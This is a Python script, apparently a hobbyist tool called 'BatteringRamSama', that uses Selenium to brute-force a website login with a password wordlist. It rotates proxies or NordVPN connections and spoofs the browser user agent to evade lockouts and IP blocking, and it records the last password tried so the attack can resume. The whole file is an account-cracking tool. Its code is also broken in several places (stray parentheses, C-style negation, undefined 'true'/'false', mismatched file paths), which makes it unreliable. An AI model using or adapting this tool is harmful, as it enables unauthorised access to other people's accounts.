#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Jul 16 13:15:02 2020

@author: alex
"""


from selenium import webdriver
from getProxies import getProxies
import openvpn_api.VPN
import configparser as cp
import time
import calendar
import os

def linuxNordVPN(i,usrname,passwd):
    dir="cd /etc/openvpn/ovpn_tcp/"
    os.system(dir+" && ls -al >> C://nordList.txt")
    f=open("C://nordList.txt",'r')
    vpnlist=[]
    while True:
        vpn=f.readline()
        if vpn!="":
            vpnlist.append(vpn)
        else:
            break
    v = openvpn_api.VPN('localhost', 7505)
    v.connect()
    return v
    
    
def changeProxy(PROXY_HOST,PROXY_PORT):
    fp = webdriver.FirefoxProfile()
    print (PROXY_PORT)
    print (PROXY_HOST)
    fp.set_preference("network.proxy.type", 1)
    fp.set_preference("network.proxy.http",PROXY_HOST)
    fp.set_preference("network.proxy.http_port",int(PROXY_PORT))
    fp.set_preference("network.proxy.https",PROXY_HOST)
    fp.set_preference("network.proxy.https_port",int(PROXY_PORT))
    fp.set_preference("network.proxy.ssl",PROXY_HOST)
    fp.set_preference("network.proxy.ssl_port",int(PROXY_PORT))  
    fp.set_preference("network.proxy.ftp",PROXY_HOST)
    fp.set_preference("network.proxy.ftp_port",int(PROXY_PORT))   
    fp.set_preference("network.proxy.socks",PROXY_HOST)
    fp.set_preference("network.proxy.socks_port",int(PROXY_PORT))   
    fp.set_preference("general.useragent.override","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A")
    fp.update_preferences()
    return webdriver.Firefox(firefox_profile=fp)

class BatteringRamSama():
    def __init__(self,conf):
        proxies=getProxies()
        self.proxyAddresses=proxies.returnIPs()
        self.proxyPorts=proxies.returnPorts()
    
        self.passwordFile=str(conf['SETTINGS']['password_file'])
        self.changeProxy=int(conf['SETTINGS']['change_proxy'])
        self.sleepTime=int(conf['SETTINGS']['wait_between_logins'])
        self.username=str(conf['SETTINGS']['username'])
        self.lastPassword=str(conf['SETTINGS']['last_password'])
        self.resetProxies=int(conf['SETTINGS']['reset_proxies'])
        
        self.signInPage=str(conf['WEB_SETTINGS']['webpage'])
        self.usernameXpath=str(conf['WEB_SETTINGS']['username_xpath'])
        self.passwordXpath=str(conf['WEB_SETTINGS']['password_xpath'])
        self.submitButtonXpath=str(conf['WEB_SETTINGS']['submit_button_xpath'])
        
        self.nordPassword=str(conf['NORD_SETTINGS']['nord_password']))
        self.nordUsername=str(conf['NORD_SETTINGS']['nord_username']))
        if self.nordPassword !="" and self.nordUsername!="":
            self.nord=true
        else:
            self.nord=false
            proxies=getProxies()
            self.proxyAddresses=proxies.returnIPs()
            self.proxyPorts=proxies.returnPorts()
        
        
    def BruteForceTime(self):
        f=open(self.passwordFile,'r')
        nordVPN=0
        password='greaterThanOne'
        counter=self.changeProxy
        first=True
        i=0
        foundLastPassword=False
        startTime=int(calendar.timegm(time.gmtime()))
        passwordAttempts=0
        while password!="":
            if self.lastPassword=="" or foundLastPassword:
                counter+=1
                if counter>=self.changeProxy:
                    if not first:
                        self.driver.close()        
                    if self.nord:
                        if nordVPN!=0:
                            nordVPN.disconect()                       
                        nordVPN=linuxNordVPN(i,self.nordUsername,self.nordPassword)
                        self.driver=webdriver.Firefox()
                    else:
                        self.driver=changeProxy(self.proxyAddresses[i],self.proxyPorts[i])
                    try:
                        self.driver.get(self.signInPage)
                        badConn=False
                    except:
                        badConn=True
                        if !self.nord:
                            self.proxyAddresses.remove(self.proxyAddresses[i])
                            self.proxyPorts.remove(self.proxyPorts[i])
                        counter+=self.changeProxy
                    counter=0
                    first=False
                    i+=1                
                if i>=len(self.proxyAddresses) and !self.nord:
                    i=0
                if (startTime-int(calendar.timegm(time.gmtime())))/3600>self.resetProxies and !self.nord:
                    proxies=getProxies()
                    self.proxyAddresses=proxies.returnIPs()
                    self.proxyPorts=proxies.returnPorts()
                time.sleep(self.sleepTime)
                
                if not badConn:
                    password=f.readline()
                    passwordAttempts+=1
                    try:
                        usernameEle=self.driver.find_element_by_xpath(self.usernameXpath)
                        passwordEle=self.driver.find_element_by_xpath(self.passwordXpath)
                        subButEle=self.driver.find_element_by_xpath(self.submitButtonXpath)
                        
                        usernameEle.send_keys(self.username)
                        passwordEle.send_keys(password)
                        subButEle.click()           
                    
                    except:
                        print(password)
                        break
                    try:
                        usernameEle=self.driver.find_element_by_xpath(self.usernameXpath)
                    except:
                        print(password)
                        break
                    save=open("lastPassword.txt",'w')
                    save.write(password)
                    save.close()
                    print("Attempt "+str(passwordAttempts))
            else:
                password=f.readline()
                if password==self.lastPassword:
                    foundLastPassword=True
            
        f.close()
        self.driver.close()
        print("Correct Password was "+ password)
                
            
            
            
                        
if __name__ == "__main__":
    config = cp.ConfigParser()
    config.read('batteringRam.ini')
    BRS=BatteringRamSama(config)
    BRS.BruteForceTime()
